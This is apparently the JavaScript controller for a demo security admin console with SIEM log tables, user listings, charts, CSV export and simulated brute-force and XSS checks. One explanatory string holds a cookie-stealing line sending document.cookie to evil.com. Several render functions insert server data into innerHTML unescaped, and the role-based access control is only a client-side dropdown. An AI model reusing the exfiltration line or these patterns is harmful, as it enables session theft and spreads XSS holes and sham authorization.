// --- Admin SIEM & Database Audit Controller for AuthGuard-MFA ---

let severityChart = null;
let timelineChart = null;
let loadedLogs = [];
let loadedUsers = [];

async function initAdminPanel() {
  const token = localStorage.getItem('token');
  if (!token) {
    window.location.href = 'login.html';
    return;
  }

  // Bind event listeners programmatically to comply with Helmet CSP headers
  const refreshBtn = document.getElementById('btn-refresh-audit');
  if (refreshBtn) refreshBtn.addEventListener('click', refreshAdminData);

  const exportBtn = document.getElementById('btn-export-csv');
  if (exportBtn) exportBtn.addEventListener('click', downloadCsvReport);

  const rbacSelect = document.getElementById('rbac-role-select');
  if (rbacSelect) rbacSelect.addEventListener('change', applyRbacPolicy);

  const bruteBtn = document.getElementById('btn-trigger-brute');
  if (bruteBtn) bruteBtn.addEventListener('click', simulateBruteForce);

  const sanitizeBtn = document.getElementById('btn-sanitize-xss');
  if (sanitizeBtn) sanitizeBtn.addEventListener('click', simulateXssCheck);

  const cookieBtn = document.getElementById('btn-audit-cookie');
  if (cookieBtn) cookieBtn.addEventListener('click', auditCookieAccess);

  const clearBtn = document.getElementById('btn-clear-terminal');
  if (clearBtn) clearBtn.addEventListener('click', clearSimTerminal);

  const ingestBtn = document.getElementById('btn-ingest-log');
  if (ingestBtn) ingestBtn.addEventListener('click', simulateLogParsing);

  // Fetch SIEM logs and Users list
  await refreshAdminData();
}

async function refreshAdminData() {
  const token = localStorage.getItem('token');
  clearAlerts();

  try {
    // 1. Fetch Cloud SIEM Logs
    const resLogs = await fetch('/api/auth/logs', {
      method: 'GET',
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (resLogs.status === 403) {
      // User is logged in but doesn't pass requireMfa
      showAlert('ACCESS DENIED: Multi-Factor Authentication (MFA) clearance is required to access the Security Operations Console.', 'danger');
      document.getElementById('siem-logs-tbody').innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--accent-danger); font-weight: bold;"><i class="fa-solid fa-lock"></i> Access Blocked: MFA Credentials Required</td></tr>`;
      document.getElementById('security-headers-tbody').innerHTML = `<tr><td colspan="4" style="text-align: center; color: var(--accent-danger); font-weight: bold;">Access Blocked</td></tr>`;
      document.getElementById('users-tbody').innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--accent-danger); font-weight: bold;"><i class="fa-solid fa-lock"></i> Access Blocked: MFA Credentials Required</td></tr>`;
      return;
    }

    if (!resLogs.ok) {
      throw new Error('Failed to fetch security logs.');
    }

    const logs = await resLogs.json();
    loadedLogs = logs; // Save globally for exporting
    renderSiemLogs(logs);

    // 1.5 Fetch Security Response Headers (WAS Audit)
    const resHeaders = await fetch('/api/auth/security-headers');
    if (resHeaders.ok) {
      const headers = await resHeaders.json();
      renderSecurityHeaders(headers);
    }

    // 2. Fetch SQLite User Database
    const resUsers = await fetch('/api/auth/users', {
      method: 'GET',
      headers: { 'Authorization': `Bearer ${token}` }
    });

    if (!resUsers.ok) {
      throw new Error('Failed to fetch user database.');
    }

    const users = await resUsers.json();
    loadedUsers = users; // Save globally for RBAC policy switching
    renderUsersDatabase(users);

    // Update graphical chart analysis (WAS Metric Dashboard)
    updateCharts(logs);

  } catch (err) {
    showAlert(err.message, 'danger');
  }
}

// Renders security headers auditor table
function renderSecurityHeaders(headers) {
  const tbody = document.getElementById('security-headers-tbody');
  if (!tbody) return;

  tbody.innerHTML = headers.map(header => {
    return `
      <tr>
        <td style="font-weight: 600; color: var(--accent-secondary);">${header.name}</td>
        <td><code>${header.value}</code></td>
        <td style="font-size: 0.8rem; color: var(--text-secondary);">${header.description}</td>
        <td><span class="badge badge-success" style="background: rgba(0, 255, 204, 0.15); color: var(--accent-primary); border: 1px solid var(--accent-primary);">${header.status}</span></td>
      </tr>
    `;
  }).join('');
}

// Sandbox terminal helper
function writeTerminal(message, type = 'info') {
  const terminal = document.getElementById('sim-terminal');
  if (!terminal) return;

  const timestamp = new Date().toLocaleTimeString();
  let color = 'var(--text-primary)';
  let prefix = '[i]';

  if (type === 'success') {
    color = 'var(--accent-primary)';
    prefix = '[+]';
  } else if (type === 'warning') {
    color = 'var(--accent-warning)';
    prefix = '[!]';
  } else if (type === 'error') {
    color = 'var(--accent-danger)';
    prefix = '[-]';
  }

  terminal.innerHTML += `<div style="color: ${color}; margin-bottom: 0.25rem;">${timestamp} ${prefix} ${message}</div>`;
  terminal.scrollTop = terminal.scrollHeight;
}

function clearSimTerminal() {
  const terminal = document.getElementById('sim-terminal');
  if (terminal) {
    terminal.innerHTML = `<span style="color: var(--text-secondary);">[system] Sandbox terminal cleared. Ready...</span>`;
  }
}

// 1. Simulate Brute Force endpoint rate limits
async function simulateBruteForce() {
  writeTerminal('Initiating Brute-Force Simulation: Sending 10 login requests in 2 seconds...', 'warning');
  
  for (let i = 1; i <= 10; i++) {
    // Delay slightly to print logs progressively
    await new Promise(resolve => setTimeout(resolve, 200));

    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: `victim_user`, password: `wrong_pass_${i}` })
      });

      if (res.status === 429) {
        writeTerminal(`Request #${i}: HTTP 429 Too Many Requests (BLOCKED by AuthLimiter)`, 'error');
      } else {
        writeTerminal(`Request #${i}: HTTP ${res.status} Unauthorized (Failed login recorded)`, 'info');
      }
    } catch (err) {
      writeTerminal(`Request #${i}: Connection error`, 'error');
    }
  }

  writeTerminal('Simulation complete. Check SIEM Logs panel to verify log trail!', 'success');
  // Auto-refresh the logs database
  setTimeout(() => {
    refreshAdminData();
  }, 1000);
}

// 2. Simulate XSS sanitization
async function simulateXssCheck() {
  const input = document.getElementById('xss-input').value;
  const resultDiv = document.getElementById('xss-result');

  if (!input) return;

  writeTerminal(`Sending raw XSS payload: "${input}" to backend sanitization service...`, 'info');

  try {
    const res = await fetch('/api/auth/sanitize-demo', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ input })
    });

    const data = await res.json();
    if (res.ok) {
      writeTerminal('Payload sanitized successfully by server regex engines.', 'success');
      writeTerminal(`Original: ${data.original}`, 'warning');
      writeTerminal(`Escaped: ${data.sanitized}`, 'success');

      resultDiv.style.display = 'block';
      resultDiv.innerHTML = `
        <strong>Result:</strong> ${data.sanitized}<br>
        <span style="color: var(--text-secondary); font-size: 0.7rem;">${data.explanation}</span>
      `;
    }
  } catch (err) {
    writeTerminal('Failed to execute XSS simulation API.', 'error');
  }
}

// 3. Audit document cookie access
function auditCookieAccess() {
  writeTerminal('Auditing local browser session cookies via document.cookie...', 'info');

  const cookies = document.cookie;
  const resultDiv = document.getElementById('cookie-result');
  resultDiv.style.display = 'block';

  if (!cookies) {
    writeTerminal('SUCCESS: No session token cookies were readable by Javascript engines.', 'success');
    writeTerminal('Defense mechanism validated: Server uses HttpOnly flags to shield cookies from cross-site scripts.', 'success');
    resultDiv.innerHTML = `
      <span style="color: var(--accent-primary);"><i class="fa-solid fa-circle-check"></i> SECURED: document.cookie is empty!</span><br>
      <span style="color: var(--text-secondary); font-size: 0.7rem;">This blocks attackers from stealing session tokens using XSS scripts like <code>fetch('evil.com?c=' + document.cookie)</code>.</span>
    `;
  } else {
    writeTerminal('WARNING: Cookies were detected in the local document window.', 'warning');
    resultDiv.innerHTML = `
      <span style="color: var(--accent-warning);"><i class="fa-solid fa-triangle-exclamation"></i> Cookies Read: "${cookies}"</span><br>
      <span style="color: var(--text-secondary); font-size: 0.7rem;">Ensure session tokens do not contain credentials unless flagged with HttpOnly.</span>
    `;
  }
}


// Render SIEM logs table
function renderSiemLogs(logs) {
  const tbody = document.getElementById('siem-logs-tbody');
  if (logs.length === 0) {
    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center;">No audit logs available.</td></tr>`;
    return;
  }

  tbody.innerHTML = logs.map(log => {
    // Convert to readable timestamp
    const date = new Date(log.timestamp).toLocaleString();
    const severityClass = `severity-${log.severity}`;
    
    return `
      <tr>
        <td>${date}</td>
        <td><span class="badge ${log.severity === 'CRITICAL' ? 'btn-danger' : log.severity === 'WARNING' ? 'badge-warning' : 'badge-success'}">${log.severity}</span></td>
        <td class="${severityClass}">${log.event_type}</td>
        <td>${log.username || '<span style="color:var(--text-secondary);">system</span>'}</td>
        <td><code>${log.ip_address || '127.0.0.1'}</code></td>
        <td>${log.details}</td>
      </tr>
    `;
  }).join('');
}

// Render Users Database table
function renderUsersDatabase(users) {
  const tbody = document.getElementById('users-tbody');
  if (users.length === 0) {
    tbody.innerHTML = `<tr><td colspan="6" style="text-align: center;">No registered users.</td></tr>`;
    return;
  }

  tbody.innerHTML = users.map(user => {
    const mfaStatus = user.mfa_enabled 
      ? `<span class="badge badge-success"><i class="fa-solid fa-lock"></i> Enabled</span>` 
      : `<span class="badge badge-warning"><i class="fa-solid fa-lock-open"></i> Disabled</span>`;
    
    const date = new Date(user.created_at).toLocaleDateString();

    return `
      <tr>
        <td><code>${user.id}</code></td>
        <td style="font-weight: 600; color: var(--accent-secondary);">${user.username}</td>
        <td>${user.email}</td>
        <td><span class="db-hash-cell" title="${user.password_hash}">${user.password_hash}</span></td>
        <td>${mfaStatus}</td>
        <td>${date}</td>
      </tr>
    `;
  }).join('');
}

// 3. Render and Update compliance visualizer charts (Chart.js integrations)
function updateCharts(logs) {
  if (!logs || logs.length === 0) return;

  // 3.1 Calculate severity totals
  let infoCount = 0;
  let warnCount = 0;
  let critCount = 0;

  logs.forEach(log => {
    if (log.severity === 'INFO') infoCount++;
    else if (log.severity === 'WARNING') warnCount++;
    else if (log.severity === 'CRITICAL') critCount++;
  });

  // Render/Update severity doughnut
  const ctxD = document.getElementById('severityDoughnutChart');
  if (ctxD) {
    if (severityChart) {
      severityChart.data.datasets[0].data = [infoCount, warnCount, critCount];
      severityChart.update();
    } else {
      severityChart = new Chart(ctxD, {
        type: 'doughnut',
        data: {
          labels: ['INFO', 'WARNING', 'CRITICAL'],
          datasets: [{
            data: [infoCount, warnCount, critCount],
            backgroundColor: ['#00ffcc', '#ffaa00', '#ff3366'],
            borderColor: 'rgba(11, 15, 25, 0.8)',
            borderWidth: 2,
            hoverOffset: 4
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: {
              position: 'bottom',
              labels: {
                color: '#9ca3af',
                font: { family: 'Inter', size: 10 }
              }
            }
          }
        }
      });
    }
  }

  // 3.2 Render/Update Threat Timeline of last 10 security logs
  const lastLogs = [...logs].slice(0, 10).reverse(); // chronological ordering
  const labels = lastLogs.map(log => new Date(log.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }));
  
  // Severity scores: INFO = 1, WARNING = 3, CRITICAL = 5
  const threatScores = lastLogs.map(log => {
    if (log.severity === 'CRITICAL') return 5;
    if (log.severity === 'WARNING') return 3;
    return 1;
  });

  const ctxT = document.getElementById('threatTimelineChart');
  if (ctxT) {
    if (timelineChart) {
      timelineChart.data.labels = labels;
      timelineChart.data.datasets[0].data = threatScores;
      // Re-map dot colors dynamically
      timelineChart.data.datasets[0].pointBackgroundColor = lastLogs.map(log => {
        if (log.severity === 'CRITICAL') return '#ff3366';
        if (log.severity === 'WARNING') return '#ffaa00';
        return '#00ffcc';
      });
      timelineChart.update();
    } else {
      timelineChart = new Chart(ctxT, {
        type: 'line',
        data: {
          labels: labels,
          datasets: [{
            label: 'Incident Level',
            data: threatScores,
            borderColor: '#00e5ff',
            backgroundColor: 'rgba(0, 229, 255, 0.06)',
            borderWidth: 3,
            fill: true,
            tension: 0.35,
            pointBackgroundColor: lastLogs.map(log => {
              if (log.severity === 'CRITICAL') return '#ff3366';
              if (log.severity === 'WARNING') return '#ffaa00';
              return '#00ffcc';
            }),
            pointBorderColor: 'rgba(11, 15, 25, 0.8)',
            pointBorderWidth: 1.5,
            pointRadius: 5,
            pointHoverRadius: 7
          }]
        },
        options: {
          responsive: true,
          maintainAspectRatio: false,
          plugins: {
            legend: { display: false }
          },
          scales: {
            x: {
              grid: { color: 'rgba(255, 255, 255, 0.04)' },
              ticks: { color: '#9ca3af', font: { family: 'Inter', size: 9 } }
            },
            y: {
              min: 0,
              max: 6,
              grid: { color: 'rgba(255, 255, 255, 0.04)' },
              ticks: {
                color: '#9ca3af',
                font: { family: 'Inter', size: 9 },
                stepSize: 1,
                callback: function(value) {
                  if (value === 1) return 'INFO';
                  if (value === 3) return 'WARN';
                  if (value === 5) return 'CRIT';
                  return '';
                }
              }
            }
          }
        }
      });
    }
  }
}

// 4. Tab Switcher Controller (SPA Navigation)
function switchTab(tabName) {
  // Hide all tab content containers
  const contents = document.querySelectorAll('.tab-content');
  contents.forEach(c => c.classList.remove('active'));

  // Remove active state from all tab buttons
  const buttons = document.querySelectorAll('.tab-btn');
  buttons.forEach(b => b.classList.remove('active'));

  // Show active tab
  const activeContent = document.getElementById(`tab-${tabName}`);
  if (activeContent) activeContent.classList.add('active');

  // Set active button state
  // Match buttons by their onclick attribute
  buttons.forEach(b => {
    if (b.getAttribute('onclick').includes(tabName)) {
      b.classList.add('active');
    }
  });

  // Force chart canvas updates on tab change to prevent sizing issues
  if (tabName === 'threat-monitor') {
    if (severityChart) severityChart.resize();
    if (timelineChart) timelineChart.resize();
  }
}

// 5. Interactive SIEM Ingestion & Log Parser Playground
function simulateLogParsing() {
  const input = document.getElementById('raw-log-input').value.trim();
  const resultDiv = document.getElementById('log-parse-result');

  if (!input) {
    alert('Please enter or modify the raw log text first!');
    return;
  }

  // Regular expressions to extract details
  const eventMatch = input.match(/event[":\s]+([A-Z_]+)/i) || input.match(/(AUTH_[A-Z_]+|REGISTRATION_[A-Z_]+|BRUTE_[A-Z_]+)/);
  const userMatch = input.match(/user[":\s]+([a-zA-Z0-9_@.]+)/i) || input.match(/username:\s*([a-zA-Z0-9_@.]+)/i);
  const ipMatch = input.match(/ip[":\s]+([a-fA-F0-9.:]+)/i) || input.match(/IP:\s*([a-fA-F0-9.:]+)/);
  const severityMatch = input.match(/severity[":\s]+([A-Z]+)/i) || input.match(/(INFO|WARNING|CRITICAL)/i);

  const eventType = eventMatch ? eventMatch[1].toUpperCase() : 'UNKNOWN_EVENT';
  const username = userMatch ? userMatch[1] : 'anonymous';
  const ipAddress = ipMatch ? ipMatch[1] : '127.0.0.1';
  const severity = severityMatch ? severityMatch[1].toUpperCase() : 'INFO';

  // Display parsed values
  document.getElementById('parsed-event').innerText = eventType;
  document.getElementById('parsed-user').innerText = username;
  document.getElementById('parsed-ip').innerText = ipAddress;
  document.getElementById('parsed-severity').innerText = severity;

  const snsAlertDiv = document.getElementById('simulated-sns-alert');
  
  if (severity === 'CRITICAL' || severity === 'WARNING') {
    document.getElementById('parsed-severity').style.color = severity === 'CRITICAL' ? 'var(--accent-danger)' : 'var(--accent-warning)';
    
    snsAlertDiv.innerHTML = `
      <div style="background: rgba(255, 51, 102, 0.1); border: 1px solid rgba(255, 51, 102, 0.3); padding: 1rem; border-radius: 8px; margin-top: 1rem;">
        <h6 style="color: var(--accent-danger); margin-bottom: 0.25rem; font-size: 0.8rem;"><i class="fa-solid fa-bell"></i> Simulated AWS CloudWatch Alarm Triggered</h6>
        <p style="font-size: 0.72rem; color: var(--text-secondary); line-height: 1.4;">
          <strong>SNS Topic:</strong> <code>arn:aws:sns:us-east-1:1234567890:SecurityAlerts</code><br>
          <strong>Message Payload:</strong> <code>[ALERT] Severity: ${severity} | Incident: ${eventType} | Attacker IP: ${ipAddress} | Account Target: ${username}. Trimming IP limits immediately.</code>
        </p>
      </div>
    `;
  } else {
    document.getElementById('parsed-severity').style.color = 'var(--accent-primary)';
    snsAlertDiv.innerHTML = `
      <div style="background: rgba(0, 255, 204, 0.05); border: 1px solid rgba(0, 255, 204, 0.2); padding: 1rem; border-radius: 8px; margin-top: 1rem;">
        <h6 style="color: var(--accent-primary); margin-bottom: 0.25rem; font-size: 0.8rem;"><i class="fa-solid fa-circle-check"></i> Standard Event Parsed</h6>
        <span style="font-size: 0.72rem; color: var(--text-secondary);">Incident severity weight fits within baseline compliance parameters. No alarm dispatched.</span>
      </div>
    `;
  }

  resultDiv.style.display = 'block';
}

// 6. Export Security Event Logs to CSV/Excel (Robust Blob API with UTF-8 BOM for Excel compatibility)
function downloadCsvReport() {
  if (!loadedLogs || loadedLogs.length === 0) {
    alert('No security event logs available to export! Please refresh the audit logs.');
    return;
  }

  // Column Headers
  let csv = 'Timestamp,Severity,Event Type,Username,IP Address,Details\n';
  
  loadedLogs.forEach(log => {
    // Format timestamp locally so Excel loads it as a proper readable date
    const timestamp = log.timestamp ? new Date(log.timestamp).toLocaleString() : '';
    const severity = log.severity || 'INFO';
    const eventType = log.event_type || 'UNKNOWN';
    const username = log.username || 'anonymous';
    const ipAddress = log.ip_address || '::1';
    const details = (log.details || '').replace(/"/g, '""'); // Escape double quotes
    
    csv += `"${timestamp}","${severity}","${eventType}","${username}","${ipAddress}","${details}"\n`;
  });

  // Prefix with UTF-8 BOM (\ufeff) to force Excel to read encoding and commas correctly
  const blob = new Blob(["\ufeff" + csv], { type: 'text/csv;charset=utf-8;' });
  const link = document.createElement('a');
  const url = URL.createObjectURL(blob);
  link.setAttribute('href', url);
  link.setAttribute('download', `AuthGuard_SIEM_SecurityReport_${Date.now()}.csv`);
  link.style.visibility = 'hidden';
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// 7. Role-Based Access Control (RBAC) Least Privilege Policy Enforcer
function applyRbacPolicy() {
  const role = document.getElementById('rbac-role-select').value;
  const logTbody = document.getElementById('siem-logs-tbody');
  const userTbody = document.getElementById('users-tbody');

  // Simulator buttons references
  const bruteBtn = document.querySelector('button[onclick="simulateBruteForce()"]');
  const sanitizeBtn = document.querySelector('button[onclick="simulateXssCheck()"]');
  const cookieBtn = document.querySelector('button[onclick="auditCookieAccess()"]');

  if (role === 'Guest') {
    // Redact all logs (Least Privilege Breach defense)
    if (logTbody) {
      logTbody.innerHTML = `
        <tr>
          <td colspan="6" style="text-align: center; color: var(--accent-danger); font-weight: bold; padding: 2.5rem; background: rgba(255, 51, 102, 0.05);">
            <i class="fa-solid fa-circle-exclamation" style="font-size: 1.5rem; margin-bottom: 0.5rem; display: block;"></i> 
            ACCESS REJECTED: Current Role 'Guest' violates Least Privilege Policies.<br>
            <span style="font-weight: normal; font-size: 0.75rem; color: var(--text-secondary); display: block; margin-top: 0.25rem;">
              Logs redacted to prevent unauthorized data exposure (OWASP A01: Broken Access Control).
            </span>
          </td>
        </tr>
      `;
    }

    // Redact Users DB Inspector
    if (userTbody) {
      userTbody.innerHTML = `
        <tr>
          <td colspan="6" style="text-align: center; color: var(--accent-danger); font-weight: bold; padding: 2rem;">
            <i class="fa-solid fa-lock" style="margin-bottom: 0.5rem; display: block;"></i> Restricted: Insufficient privileges to inspect user database.
          </td>
        </tr>
      `;
    }

    // Disable Attack Simulator Actions
    if (bruteBtn) bruteBtn.disabled = true;
    if (sanitizeBtn) sanitizeBtn.disabled = true;
    if (cookieBtn) cookieBtn.disabled = true;

  } else if (role === 'SecOps') {
    // Restore logs view (SecOps has log reading clearance)
    renderSiemLogs(loadedLogs);

    // Partially Redact User DB hashes (Cryptographic shielding)
    if (userTbody && loadedUsers.length > 0) {
      userTbody.innerHTML = loadedUsers.map(user => {
        return `
          <tr>
            <td>${user.id}</td>
            <td>${user.username}</td>
            <td>${user.email}</td>
            <td style="font-family: monospace; color: var(--accent-warning); font-size: 0.75rem; font-style: italic;">
              [REDACTED: SecOps Role has no Cryptographic Clearance]
            </td>
            <td><span class="badge ${user.mfa_enabled ? 'badge-success' : 'badge-warning'}">${user.mfa_enabled ? 'Active' : 'Disabled'}</span></td>
            <td>${user.created_at}</td>
          </tr>
        `;
      }).join('');
    }

    // Disable Attack Simulator Actions (SecOps cannot write/execute exploits)
    if (bruteBtn) bruteBtn.disabled = true;
    if (sanitizeBtn) sanitizeBtn.disabled = true;
    if (cookieBtn) cookieBtn.disabled = true;

  } else if (role === 'Admin') {
    // Full access: Restore logs
    renderSiemLogs(loadedLogs);

    // Restore full database table (including Bcrypt hashes)
    renderUsersDatabase(loadedUsers);

    // Enable Attack Simulator Actions
    if (bruteBtn) bruteBtn.disabled = false;
    if (sanitizeBtn) sanitizeBtn.disabled = false;
    if (cookieBtn) cookieBtn.disabled = false;
  }
}



